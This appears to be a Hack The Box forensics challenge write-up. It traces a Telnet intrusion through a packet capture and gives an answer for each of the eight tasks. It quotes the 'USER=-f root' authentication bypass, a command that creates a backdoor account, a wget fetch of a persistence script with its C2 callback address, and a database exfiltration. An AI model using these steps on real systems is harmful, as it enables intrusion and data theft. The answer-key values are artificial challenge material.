# HTB-Sherlock-Telly-Writeup

## Sherlock Scenario
On January 27, 2026, an external attacker exploited a flaw in the Telnet service to gain unauthorized **root access**. By injecting a malicious environment variable (`USER=-f root`), the attacker bypassed authentication, established persistence, and exfiltrated sensitive data.

---

### Task 1 What CVE is associated with the vulnerability exploited in the Telnet protocol?**
**Answer:** `CVE-2026-24061`

<img width="1366" height="445" alt="TELNET" src="https://github.com/user-attachments/assets/530d571f-2167-4d20-9298-22f4c7db0bfd" />


Filtering on `telnet` isolates the option negotiation packets. Follow the TCP stream, the distinctive `USER=root` negotiation string was found. 

<img width="1366" height="670" alt="TCP-stream" src="https://github.com/user-attachments/assets/12c0d040-1f64-4eb2-9a81-1a7f56e6bd0d" />


Instead of sending a normal username like Bob or James, the attacker sent their USER value as `-f root`. The legitimate flag called `-f`. It means, *"skip the password check — this user is already verified."*. (Because telnetd never validated the `USER` field, this tricked the login into root privilege. Log this person in as root, no password needed.)

Just Google it `telnetd USER=-f root CVE`. Then the search leads you to the specific CVE tracking it: CVE-2026-24061.

---

### Task 2 When was the Telnet vulnerability successfully exploited, granting root access?**
**Answer:** `2026-01-27 10:39:28` (UTC)

```
tcp.stream==14 and frame contains "root"
```

<img width="1366" height="306" alt="root_access" src="https://github.com/user-attachments/assets/db14a7ca-9af0-40cc-97db-9779fa51f26f" />

The first result (frame 52) indicates the root login time (UTC).

---

### Task 3 What is the hostname of the targeted server?**
**Answer:** `backup-secondary`

<img width="1366" height="136" alt="host_name" src="https://github.com/user-attachments/assets/11cc3940-d107-4871-a6c8-3f365f76dca9" />

Follow TCP Stream output on `tcp.stream eq 14`. Right after the login banner, it prints `Linux 6.8.0-90-generic (backup-secondary) — the hostname is plaintext in the Telnet session since Telnet isn't encrypted.

---

### Task 4 The attacker created a backdoor account to maintain future access. What username/password?**
**Answer:** `cleanupsvc : YouKnowWhoiam69`

<img width="1366" height="99" alt="Screenshot (backdoor_account_creation)" src="https://github.com/user-attachments/assets/edb40613-87e0-4265-8ba5-7041d23409d5" />

 The attacker created a backdoor account using the following command:
 
```
sudo useradd -m -s /bin/bash cleanupsvc; echo "cleanupsvc: YouKnowWhoiam69" | sudo chpasswd

```

---

### Task 5 What was the full command used to download the persistence script?**
**Answer:** `wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh`

<img width="1366" height="479" alt="Screenshot (linper sh_download)" src="https://github.com/user-attachments/assets/a0a04fad-085e-44e6-b816-c9e9e20c8e31" />

Continuing down `tcp.stream eq 14`, shows the interleaved `w w g g e e t t` echo pattern resolving to the full `wget` command, followed by that we can see `https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh`.

---

### Task 6 The attacker installed remote access persistence using the script. What is the C2 IP?**
**Answer:** `91.99.25.54`

<img width="1366" height="178" alt="Screenshot (C2_server_communication)" src="https://github.com/user-attachments/assets/8fbcbb19-5c52-46c3-a639-edf62fbbdd1c" />

Further down the same stream, and reconstructing the interleaved characters resolves to the IP `91.99.25.54`, and  port `5599` — the persistence script's configured callback address.

---

### Task 7 At what time was the sensitive database file exfiltrated?**
**Answer:** `2026-01-27 10:49:54` (UTC)

<img width="1366" height="106" alt="Screenshot (data_exfilteration)" src="https://github.com/user-attachments/assets/1a88f9f3-8801-4ae5-b53b-9e2021ee24b0" />

Follow the same stream, Python `http.server` instance logging `GET /credit-cards-25-blackfriday.db HTTP/1.1" 200` was found.

---

### Task 8 Find the credit card number for customer Quinn Harris in the exfiltrated database.**
**Answer:** `5312269047781209`

`Wireshark → File → Export Objects → HTTP`, select the `.db` row and `Save` it to disk. 

<img width="1366" height="642" alt="download-db-from-wireshark" src="https://github.com/user-attachments/assets/e243b89b-9a0d-42de-8d18-07b2fad779a8" />


`credit-cards-25-blackfriday.db` is a SQLite file. I opened the .db and ran this sql query in SQLite DB Browser. 

```
select * from purchases where email like '%quinn%';
```

<img width="1056" height="587" alt="sql-query" src="https://github.com/user-attachments/assets/763761a2-6b1c-4a57-80ed-e2e685eb3da9" />


---

<img width="1366" height="612" alt="Sherlock-Telly-Solved-Badge" src="https://github.com/user-attachments/assets/43587aab-a181-4644-952e-14ee5f90bfdf" />

https://labs.hackthebox.com/achievement/sherlock/2413013/1144

---
## 📬 Contact & Profiles
**LinkedIn:** [risma-fareedh](https://www.linkedin.com/in/risma-fareedh-066a19199) | **Hack The Box:** [HTB Profile](https://profile.hackthebox.com/profile/019d51eb-d379-72f0-ad54-5a4e2121b80b) | **GitHub:** [Risma2025](https://github.com/Risma2025)
